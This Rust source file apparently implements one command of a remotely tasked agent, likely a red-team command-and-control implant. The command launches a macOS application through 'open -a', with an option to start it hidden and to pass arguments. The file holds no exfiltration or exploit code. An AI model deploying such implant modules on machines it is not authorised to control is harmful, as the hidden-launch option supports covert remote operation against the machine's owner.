use crate::structs::Task;
use serde::Deserialize;
use tokio::process::Command;

#[derive(Deserialize)]
struct LsOpenArgs {
    application: String,
    #[serde(default, rename = "hideApp")]
    hide_app: bool,
    #[serde(default, rename = "appArgs")]
    app_args: Vec<String>,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: LsOpenArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut cmd_args = vec!["-a".to_string(), args.application.clone()];

    if args.hide_app {
        cmd_args.push("-j".to_string());
    }

    if !args.app_args.is_empty() {
        cmd_args.push("--args".to_string());
        cmd_args.extend(args.app_args);
    }

    match Command::new("open").args(&cmd_args).output().await {
        Ok(output) => {
            if output.status.success() {
                response.user_output = "Successfully spawned application.".to_string();
                response.completed = true;
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                response.set_error(&format!("Failed to spawn application: {}", stderr));
            }
        }
        Err(e) => response.set_error(&format!("Failed: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
